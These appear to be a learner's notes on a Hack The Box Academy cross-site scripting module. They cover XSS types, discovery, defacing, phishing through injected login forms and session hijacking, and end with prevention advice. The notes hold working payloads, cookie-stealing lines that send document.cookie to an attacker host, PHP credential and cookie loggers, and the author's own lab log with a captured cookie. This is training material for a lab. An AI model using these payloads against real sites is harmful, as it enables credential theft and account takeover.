# Introduction
As web applications become more advanced and more common, so do web application vulnerabilities. Among the most common types of web application vulnerabilities are Cross-Site Scripting (XSS) vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.

---

# What is XSS
A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (low impact + high probability = medium risk). We should always attempt to reduce this risk by detecting, remediating, and proactively preventing these types of vulnerabilities.

![image](https://github.com/user-attachments/assets/43127060-aad4-4d3e-bfd3-eb7a435ba887)
---

# XSS Attacks
XSS vulnerabilities can facilitate a wide range of attacks, which can be anything that can be executed through browser JavaScript code. 

- **Example 1:** Having the target user unwittingly send their session cookie to the attacker's web server.
- **Example 2:** Having the target's browser execute API calls that lead to a malicious action, like changing the user's password to a password of the attacker's choosing.
- **Other Examples:** Bitcoin mining, displaying ads, etc.

As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JavaScript engine (e.g., V8 in Chrome). They cannot execute system-wide JavaScript code or system-level commands. However, being able to execute JavaScript in a user's browser may still lead to a wide variety of attacks.

In some cases, a skilled researcher can identify a binary vulnerability in a web browser (e.g., a Heap overflow in Chrome). They can utilize an XSS vulnerability to execute a JavaScript exploit on the target's browser, which may break out of the browser's sandbox and execute code on the user's machine.

### Notable Examples
- **Samy Worm (2005):** Exploited a stored XSS vulnerability in MySpace. It posted a message, "Samy is my hero," on users' pages, which spread to over a million users in a single day.
- **TweetDeck Vulnerability (2014):** Created a self-retweeting tweet, leading to over 38,000 retweets in under two minutes, forcing Twitter to shut down TweetDeck temporarily.
- **Google Search Engine XSS (2019):** Found in the XML library, highlighting the prevalence of XSS even in prominent platforms.
- **Apache Server XSS:** Actively exploited to steal user passwords in certain companies.

---

# Types of XSS
There are three main types of XSS vulnerabilities:

| Type                  | Description                                                                                          |
|-----------------------|------------------------------------------------------------------------------------------------------|
| **Stored (Persistent) XSS** | The most critical type of XSS, occurs when user input is stored on the back-end database and displayed upon retrieval (e.g., posts or comments). |
| **Reflected (Non-Persistent) XSS** | Occurs when user input is displayed on the page after being processed by the backend server but without being stored (e.g., search result or error message). |
| **DOM-based XSS**      | A Non-Persistent XSS type that occurs when user input is directly shown in the browser and processed completely on the client-side (e.g., through client-side HTTP parameters or anchor tags). |

---

We will cover each of these types in the upcoming sections and work through exercises to see how each of them occurs. Additionally, we will explore how each of them can be utilized in attacks and how to mitigate them.

---

# Stored XSS

Before we learn how to discover XSS vulnerabilities and utilize them for various attacks, we must first understand the different types of XSS vulnerabilities and their differences to know which to use in each kind of attack.

The first and most critical type of XSS vulnerability is **Stored XSS** or **Persistent XSS**. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

## Example of Stored XSS

We can start the server below to view and practice a Stored XSS example. As we can see, the web page is a simple To-Do List app that we can add items to. We can try typing `test` and hitting enter/return to add a new item and see how the page handles it:

```
http://SERVER_IP:PORT/
```

As we can see, our input was displayed on the page. If no sanitization or filtering was applied to our input, the page might be vulnerable to XSS.

## XSS Testing Payloads

We can test whether the page is vulnerable to XSS with the following basic XSS payload:

```html
<script>alert(window.origin)</script>
```

We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:

```
http://SERVER_IP:PORT/
```

As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking at the page source by clicking `[CTRL+U]` or right-clicking and selecting **View Page Source**, and we should see our payload in the page source:

```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script></ul></ul>
```

### Tip:

Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on and confirm which form is the vulnerable one, in case an IFrame was being used.

### Alternative Payloads

As some modern browsers may block the `alert()` JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. Examples:

- `<plaintext>`: Stops rendering the HTML code that comes after it and displays it as plaintext.
- `<script>print()</script>`: Pops up the browser print dialog, which is unlikely to be blocked by any browsers.

Try using these payloads to see how each works. You may use the reset button to remove any current payloads.

## Verifying Persistence

To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a **Stored/Persistent XSS vulnerability**. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.

---

# Reflected XSS

There are two types of Non-Persistent XSS vulnerabilities: **Reflected XSS**, which gets processed by the back-end server, and **DOM-based XSS**, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, Non-Persistent XSS vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.

## What is Reflected XSS?

Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.

## Example of Reflected XSS

We can start the server below to practice on a web page vulnerable to a Reflected XSS vulnerability. It is a similar To-Do List app to the one we practiced with in the previous section. We can try adding any test string to see how it's handled:

```
http://SERVER_IP:PORT/
```

As we can see, we get `Task 'test' could not be added.`, which includes our input `test` as part of the error message. If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click Add:

```
http://SERVER_IP:PORT/
```

Once we click Add, we get the alert pop-up:

```
http://SERVER_IP:PORT/
```

In this case, we see that the error message now says `Task '' could not be added.` Since our payload is wrapped with a `<script>` tag, it does not get rendered by the browser, so we get empty single quotes `''` instead. We can once again view the page source to confirm that the error message includes our XSS payload:

```html
<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
```

As we can see, the single quotes indeed contain our XSS payload `'<script>alert(window.origin)</script>'`.

If we visit the Reflected page again, the error message no longer appears, and our XSS payload is not executed, which means that this XSS vulnerability is indeed Non-Persistent.

## Exploiting Non-Persistent Reflected XSS

If the XSS vulnerability is Non-Persistent, how would we target victims with it?

This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox Developer Tools by clicking `[CTRL+Shift+I]` and selecting the Network tab. Then, we can put our test payload again and click Add to send it:

```
http://SERVER_IP:PORT/
```

As we can see, the first row shows that our request was a **GET request**. GET requests send their parameters and data as part of the URL. So, to target a user, we can send them a URL containing our payload. To get the URL, we can copy the URL from the URL bar in Firefox after sending our XSS payload, or we can right-click on the GET request in the Network tab and select **Copy > Copy URL**. Once the victim visits this URL, the XSS payload would execute:

```
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```

### Note:

To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the URL.

---

# DOM XSS

The third and final type of XSS is another Non-Persistent type called **DOM-based XSS**. While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the **Document Object Model (DOM)**.

## Understanding DOM-based XSS

We can run the server below to see an example of a web application vulnerable to DOM XSS. We can try adding a test item, and we see that the web application is similar to the To-Do List web applications we previously used:

```
http://SERVER_IP:PORT/
```

However, if we open the **Network tab** in the Firefox Developer Tools, and re-add the test item, we would notice that no HTTP requests are being made:

```
http://SERVER_IP:PORT/
```

We see that the input parameter in the URL is using a hashtag `#` for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a DOM-based XSS.

Furthermore, if we look at the page source by hitting `[CTRL+U]`, we will notice that our test string is nowhere to be found. This is because the JavaScript code is updating the page when we click the **Add** button, which is after the page source is retrieved by our browser. Hence, the base page source will not show our input, and if we refresh the page, it will not be retained (i.e., Non-Persistent). We can still view the rendered page source with the **Web Inspector tool** by clicking `[CTRL+SHIFT+C]`:

```
http://SERVER_IP:PORT/
```

## Source & Sink

To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the **Source** and **Sink** of the object displayed on the page:

- **Source**: The JavaScript object that takes the user input. This can be any input parameter like a URL parameter or an input field.
- **Sink**: The function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack.

### Common Sink Functions
Some commonly used JavaScript functions that write to DOM objects are:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Additionally, some jQuery library functions that write to DOM objects include:

- `add()`
- `after()`
- `append()`

If a Sink function writes the exact input without any sanitization, the page is vulnerable to XSS.

### Example Code
In the To-Do web application, the source code of `script.js` shows the following:

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

The page then uses the `innerHTML` function to write the `task` variable into the DOM:

```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

This shows that the input is controllable, and since no sanitization is applied, the page is vulnerable to DOM XSS.

## DOM XSS Attacks

If we try the XSS payload used in previous examples, it will not execute. This is because the `innerHTML` function does not allow the use of `<script>` tags. However, we can use other XSS payloads that do not require `<script>` tags, such as:

```html
<img src="" onerror=alert(window.origin)>
```

This payload creates a new HTML image object with an `onerror` attribute that executes JavaScript code when the image is not found. As we provided an empty image link (`""`), our code will always execute without needing `<script>` tags:

```
http://SERVER_IP:PORT/#task=<img src=
'>
```

### Targeting Users
To target a user with this DOM XSS vulnerability, copy the URL from the browser and share it with them. Once they visit it, the JavaScript code will execute. Depending on the web application and browser's security, different payloads might be required, which we will discuss further in the next section.

---

# XSS Discovery

By now, we should have a good understanding of what an XSS vulnerability is, the three types of XSS, and how each type differs from the others. We should also understand how XSS works through injecting JavaScript code into the client-side page source, thus executing additional code, which we will later learn how to utilize to our advantage.

In this section, we will go through various ways of detecting XSS vulnerabilities within a web application. Detecting vulnerabilities can be as challenging as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us detect and identify them.

## Automated Discovery

Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually perform two types of scans:

1. **Passive Scan**: Reviews client-side code for potential DOM-based vulnerabilities.
2. **Active Scan**: Sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.

While paid tools often have higher accuracy in detecting XSS vulnerabilities (especially when security bypasses are required), open-source tools can also assist in identifying potential XSS vulnerabilities. These tools work by:

1. Identifying input fields in web pages.
2. Sending various types of XSS payloads.
3. Comparing the rendered page source to check if the payload is reflected, which may indicate successful XSS injection.

Some common open-source tools include:

- **XSS Strike**
- **Brute XSS**
- **XSSer**

### Using XSS Strike

```bash
# Clone the repository
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# Run XSStrike\python xsstrike.py
```

#### Example:

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

**Output:**

```
XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

The tool identified the parameter as vulnerable to XSS. Try verifying the payload by testing it in previous exercises. Experiment with other tools and observe their effectiveness in detecting XSS vulnerabilities.

## Manual Discovery

The difficulty of manual XSS discovery depends on the security level of the web application. Basic vulnerabilities can often be found by testing common XSS payloads, but advanced vulnerabilities require in-depth code review skills.

### XSS Payloads

The simplest method for finding XSS vulnerabilities is manually testing various payloads against an input field in a web page. You can find extensive payload lists online, such as:

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PayloadBox](https://github.com/payloadbox)

Examples:

```html
<script>alert(1)</script>
<img src="" onerror=alert(1)>
<style>body{background:expression(alert(1))}</style>
```

These payloads can be tested in HTML input fields or HTTP headers (e.g., Cookie, User-Agent). However, most will fail as they are designed for specific scenarios or to bypass security measures. Writing custom scripts to automate testing can save time and effort.

### Code Review

The most reliable way to detect XSS vulnerabilities is manual code review, covering both back-end and front-end code. By understanding how input is handled until it reaches the browser, you can write precise payloads with high confidence.

#### Example:

In the previous section, we reviewed HTML code for DOM-based XSS, identifying the Source and Sink. Front-end code review is essential for finding vulnerabilities that automated tools might miss. While advanced techniques are out of scope for this module, resources like **Secure Coding 101: JavaScript** and **Whitebox Pentesting 101: Command Injection** cover them extensively.

---

In summary, combining automated tools, manual testing, and code review provides the best approach to discovering XSS vulnerabilities effectively.

#Ejercicio
  ##Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?
    ```python xsstrike.py -u "http://94.237.50.41:33731/?fullname=ads&username=adas&password=ads&email=adsds%40gmail.com"```

---

# Defacing

Now that we understand the different types of XSS and various methods of discovering XSS vulnerabilities in web pages, we can start learning how to exploit these XSS vulnerabilities. As previously mentioned, the damage and the scope of an XSS attack depend on the type of XSS, with stored XSS being the most critical and DOM-based being less so.

One of the most common attacks using stored XSS vulnerabilities is website defacing. Defacing a website means changing its appearance for anyone who visits it. Hacker groups often use defacing to claim that they successfully hacked a site. For instance, hackers defaced the UK National Health Service (NHS) website in 2018. Such attacks can carry significant media attention and impact a company's reputation, investments, and share prices, especially for banks and technology firms.

## Defacement Elements

Injected JavaScript code (via XSS) can modify a web page's appearance. Defacing typically involves sending a simple message, such as "we hacked you," rather than creating a visually appealing page. Commonly used HTML elements for defacing include:

- **Background Color:** `document.body.style.background`
- **Background Image:** `document.body.background`
- **Page Title:** `document.title`
- **Page Text:** `DOM.innerHTML`

### Changing Background

To change a web page's background color, use the following payload:

```html
<script>document.body.style.background = "#141d2b"</script>
```

This sets the background to a dark color (e.g., Hack The Box's default background). For an image background, use:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

### Changing Page Title

Modify the page title using:

```html
<script>document.title = 'HackTheBox Academy'</script>
```

The browser tab/window will display the new title.

### Changing Page Text

To change text on the page, use the `innerHTML` property:

```javascript
document.getElementById("todo").innerHTML = "New Text";
```

For broader changes, replace the entire page's content:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text";
```

Example using Hack The Box Academy's HTML structure:

```html
<script>
document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>';
</script>
```

### Final Payload

Combine the changes to create a defaced web page:

```html
<script>
document.body.style.background = "#141d2b";
document.title = 'HackTheBox Academy';
document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>';
</script>
```

Once injected into a vulnerable To-Do list, this payload will persist across page refreshes, defacing the web page for all visitors.

### Observing Source Code

Even after defacement, the original source code remains intact, with the injected payload appearing at the end:

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```

The injected JavaScript executes when the page loads, changing its appearance. However, if the injection occurs in the middle of the source code, additional elements/scripts may follow, requiring adjustments to achieve the desired look.

To ordinary users, the defaced page will display the intended changes, obscuring the original content.

---

# Phishing

Phishing attacks commonly exploit XSS vulnerabilities to inject fake login forms, tricking victims into submitting sensitive information to an attacker's server. These credentials can then be used to gain unauthorized access to accounts and sensitive data. Phishing via XSS can also be used as a simulation exercise to evaluate an organization's security awareness.

## XSS Discovery

We begin by identifying an XSS vulnerability in the web application. For example, consider the following URL for an image viewer:

```
http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
```

We control the `url` parameter, allowing us to test XSS payloads. If a basic payload fails, analyze the HTML source to find a working payload. Once a suitable payload is identified, we can proceed with the phishing attack.

## Login Form Injection

To perform a phishing attack, inject an HTML login form that sends submitted credentials to a server we control. Example login form:

```html
<h3>Please login to continue</h3>
<form action="http://OUR_IP">
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Replace `OUR_IP` with your server's IP address. Minify and embed this form into a JavaScript `document.write()` function:

```javascript
document.write('<h3>Please login to continue</h3><form action="http://OUR_IP"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Inject this JavaScript code using the discovered XSS vulnerability. For example:

```
http://SERVER_IP/phishing/index.php?url=...PAYLOAD...
```

### Removing Original Elements

To make the page more convincing, remove the original `url` field using JavaScript:

```javascript
document.getElementById('urlform').remove();
```

Add this to your payload after the `document.write` function:

```javascript
document.write('<h3>Please login to continue</h3><form action="http://OUR_IP"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Comment out remaining HTML using an opening comment tag (`<!--`) after your payload:

```html
...PAYLOAD... <!-- 
```

This ensures the injected login form appears alone, giving the impression that logging in is required.

## Credential Stealing

Start a netcat listener to capture credentials:

```bash
sudo nc -lvnp 80
```

When a victim submits the form, you will capture their credentials in the request:

```
GET /?username=test&password=test&submit=Login HTTP/1.1
```

To avoid raising suspicion, use a PHP script to log credentials and redirect victims back to the original page:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Save this script as `index.php` and host it using PHP's built-in server:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

## Testing the Attack

Visit the injected URL, submit test credentials, and check the `creds.txt` file for captured data:

```bash
cat creds.txt
```

### Example Output:

```
Username: test | Password: test
```

With the PHP server running, share the URL containing the XSS payload with victims. When they log in, their credentials are captured without raising suspicion.

#Ejercicio
  ##Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

  TOdo esta aqui: [https://ludvikkristoffersen.medium.com/htb-cross-site-scripting-xss-phishing-attack-task-ec8a0a88159f](url), no es tan dificil

  Es seguir los pasos que sale en la room
---

# Session Hijacking

Modern web applications use cookies to maintain a user's session across browsing sessions. If an attacker obtains a user's cookie, they can hijack the session and gain access to the user's account without needing their credentials. By exploiting XSS vulnerabilities, attackers can steal cookies through a Session Hijacking attack.

## Blind XSS Detection

Blind XSS vulnerabilities are triggered on pages that attackers do not have access to, such as admin panels. Examples include:

- Contact forms
- Reviews
- Support tickets
- HTTP headers (e.g., User-Agent)

To detect Blind XSS vulnerabilities, inject a JavaScript payload that sends an HTTP request to the attacker's server. If the payload executes, the attacker receives a request, confirming the vulnerability.

### Loading a Remote Script

Use the following payload to load a remote script:

```html
<script src="http://OUR_IP/username"></script>
```

This payload allows identifying which input field is vulnerable based on the request received. Test different fields by replacing `username` with the field name. Example payloads:

```html
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
```

### Setting Up the Listener

Start a listener on the attacker's server to capture requests:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Test various fields with different payloads. Once a request is received, note the working payload and the vulnerable field.

## Performing Session Hijacking

After identifying the vulnerable input field, use a JavaScript payload to steal cookies and send them to the attacker's server. Example payloads:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

The second payload is less suspicious as it adds an image instead of navigating to another page.

### Hosting the Payload

Save the payload in `script.js` on the attacker's server:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Change the XSS payload to use `script.js`:

```html
<script src=http://OUR_IP/script.js></script>
```

### Setting Up the PHP Script

Write a PHP script to log cookies into a file:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Save this script as `index.php` and host it using the PHP server:

```bash
sudo php -S 0.0.0.0:80
```

### Capturing the Cookie

When the victim triggers the XSS payload, their cookie will be sent to the attacker's server:

```bash
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

The `cookies.txt` file will log the cookies:

```bash
cat cookies.txt
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

## Using the Stolen Cookie

To hijack the session, use the stolen cookie on the login page:

1. Navigate to `/hijacking/login.php`.
2. Open the **Storage** tab in Developer Tools (Shift+F9 in Firefox).
3. Add the stolen cookie:
    - **Name**: The part before `=`.
    - **Value**: The part after `=`.

Refresh the page to access the victim's account.

"><script src=http://10.10.15.137/url></script>
"><script src=http://10.10.15.137/script.js></script>
[Fri Jan 10 12:49:35 2025] 10.129.72.167:36732 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
Agregamos la cookie y asi podemos obtener la flag

---

# XSS Prevention

By now, we should have a good understanding of XSS vulnerabilities, their types, detection, and exploitation methods. This section focuses on defending against XSS vulnerabilities by addressing the **Source** (user input fields) and **Sink** (data display points) in both the front-end and back-end of web applications.

## Front-End Prevention

The front-end is where most user input originates, making it essential to sanitize and validate input using JavaScript.

### Input Validation

Use JavaScript to validate user input. For example, validating email formats:

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

### Input Sanitization

Sanitize input by escaping special characters. Use libraries like **DOMPurify**:

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize(dirty);
```

### Avoid Direct User Input

Do not directly use user input in:

- JavaScript code: `<script></script>`
- CSS styles: `<style></style>`
- HTML attributes: `<div name='INPUT'></div>`
- HTML comments: `<!-- -->`

Avoid functions that write raw HTML:

- `DOM.innerHTML`, `DOM.outerHTML`
- `document.write()`, `document.writeln()`
- jQuery functions like `html()`, `add()`, `append()`, `prepend()`

## Back-End Prevention

Back-end measures are critical for preventing Stored and Reflected XSS vulnerabilities.

### Input Validation

Validate user input using Regex or libraries. For example, validating email input in PHP:

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // Accept input
} else {
    // Reject input
}
```

In Node.js, reuse front-end validation code.

### Input Sanitization

Sanitize user input to escape special characters. For example, in PHP:

```php
addslashes($_GET['email']);
```

In Node.js, use **DOMPurify**:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

### Output HTML Encoding

Encode special characters in output to prevent injection. For example, in PHP:

```php
htmlentities($_GET['email']);
```

In Node.js, use libraries like **html-entities**:

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

### Server Configuration

Enhance security with proper server settings:

- Use **HTTPS** across the entire domain.
- Add **XSS prevention headers**.
- Set `X-Content-Type-Options=nosniff` to prevent MIME type sniffing.
- Use **Content-Security-Policy** options like `script-src 'self'` to restrict script sources.
- Set `HttpOnly` and `Secure` flags on cookies to prevent JavaScript access and ensure secure transmission.

### Web Application Firewalls (WAF)

Deploy a WAF to detect and block injection attempts. Some frameworks, such as ASP.NET, offer built-in XSS protection.

## Conclusion

Preventing XSS vulnerabilities requires a combination of front-end and back-end measures, including input validation, sanitization, encoding, server configurations, and WAFs. Even with these defenses, security gaps may remain. Regularly test for vulnerabilities using both offensive and defensive techniques to ensure robust protection against XSS attacks.


# Skills Assessment

We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:

```
http://SERVER_IP:PORT/assessment/
```

## Objectives

1. **Identify a Vulnerable Input Field**
   - Locate a user-input field that is vulnerable to XSS.
   
2. **Find a Working XSS Payload**
   - Discover and use a payload that executes JavaScript code in the target's browser.

3. **Perform Session Hijacking**
   - Apply Session Hijacking techniques to steal the victim's cookies, which should contain the flag.

Use the skills and techniques learned in this module to complete the assessment successfully.

Ejercicio
  What is the value of the 'flag' cookie?
    Es lo mismo que el anterior 
